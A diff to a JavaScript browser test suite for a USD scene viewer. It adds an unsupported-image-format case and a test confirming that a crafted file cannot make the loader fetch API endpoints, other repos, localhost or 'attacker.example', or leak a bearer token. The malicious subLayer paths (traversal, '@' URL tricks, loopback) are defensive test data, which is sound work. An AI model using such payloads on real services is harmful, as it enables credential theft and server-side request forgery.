@@ -222,7 +222,7 @@ test('a custom fetch serves the Hub listing and its prefetches, and abort cancel
   assert.deepEqual(out, { outcome: 'aborted', held: ['a.usda', 'unused.usda'], aborted: true });
 });
 
-test('textures past maxTextureBytes or 16384 px a side fail as warnings, not the load', async () => {
+test('textures past maxTextureBytes, over 16384 px a side or of unchecked formats fail as warnings, not the load', async () => {
   const out = await page.evaluate(async () => {
     const { loadUsd } = await import('/packages/viewer/src/index.js');
     // A PNG header claiming 20000 x 20000 px.
@@ -231,8 +231,9 @@ test('textures past maxTextureBytes or 16384 px a side fail as warnings, not the
     new DataView(huge.buffer).setUint32(16, 20000);
     new DataView(huge.buffer).setUint32(20, 20000);
     huge.set([8, 6], 24);
+    const gif = new TextEncoder().encode('GIF89a\x10\x00\x10\x00\x00\x00\x00');
     const outcomes = [];
-    for (const [options, png] of [[{ maxTextureBytes: 100 }, null], [{}, huge]]) {
+    for (const [options, png] of [[{ maxTextureBytes: 100 }, null], [{}, huge], [{}, gif]]) {
       const fetchFn = (u, init) => (png && u.endsWith('.png') ? Promise.resolve(new Response(png)) : fetch(u, init));
       const result = await loadUsd('/conformance/fixtures/uv_set.usda', { ...options, fetch: fetchFn });
       outcomes.push({ counts: await result.complete, messages: result.info.warnings.filter((w) => w.code === 'texture-failed').map((w) => w.message) });
@@ -240,9 +241,44 @@ test('textures past maxTextureBytes or 16384 px a side fail as warnings, not the
     }
     return outcomes;
   });
-  assert.deepEqual(out.map((o) => o.counts), [{ textures: 0, failed: 1 }, { textures: 0, failed: 1 }]);
+  assert.deepEqual(out.map((o) => o.counts), [{ textures: 0, failed: 1 }, { textures: 0, failed: 1 }, { textures: 0, failed: 1 }]);
   assert.match(out[0].messages[0], /maxTextureBytes/);
   assert.match(out[1].messages[0], /image too large: 20000x20000/);
+  assert.match(out[2].messages[0], /unsupported image format/);
+});
+
+test('a file cannot make a Hub load request API endpoints, other hosts or credentials outside its repo', async () => {
+  const root = 'https://huggingface.co/datasets/o/r/resolve/main/pkg/ssrf.usda';
+  const usda = `#usda 1.0
+(subLayers = [@../../../../../../api/whoami-v2.usda@, @/victim/private/resolve/main/secret.usda@, @@@https://huggingface.co@attacker.example/a.usda@@@, @http://127.0.0.1:9/admin.usda@])
+def Mesh "M" {
+  int[] faceVertexCounts = [3]
+  int[] faceVertexIndices = [0, 1, 2]
+  point3f[] points = [(0, 0, 0), (1, 0, 0), (0, 1, 0)]
+}`;
+  const seen = [];
+  const record = async (route) => {
+    const request = route.request();
+    seen.push([request.url(), (await request.allHeaders()).authorization ?? null]);
+    if (request.url() === root) return route.fulfill({ body: usda, headers: { 'access-control-allow-origin': '*' } });
+    return route.fulfill({ status: 404, headers: { 'access-control-allow-origin': '*' } });
+  };
+  await page.context().route('https://huggingface.co/**', record);
+  await page.context().route('https://attacker.example/**', record);
+  const warnings = await page.evaluate(async (url) => {
+    const { loadUsd } = await import('/packages/viewer/src/index.js');
+    const result = await loadUsd(url, { headers: { Authorization: 'Bearer hub-dummy' } });
+    result.dispose();
+    return result.info.warnings.filter((w) => w.code === 'layer-missing').length;
+  }, root);
+  await page.context().unroute('https://huggingface.co/**');
+  await page.context().unroute('https://attacker.example/**');
+  const files = seen.filter(([url]) => !url.includes('/api/datasets/o/r/tree/'));
+  assert.equal(warnings, 4);
+  assert.deepEqual(files, [
+    [root, 'Bearer hub-dummy'],
+    ['https://huggingface.co/victim/private/resolve/main/secret.usda', null],
+  ]);
 });
 
 test('warnings name grey fallback materials and unresolved layers', async () => {
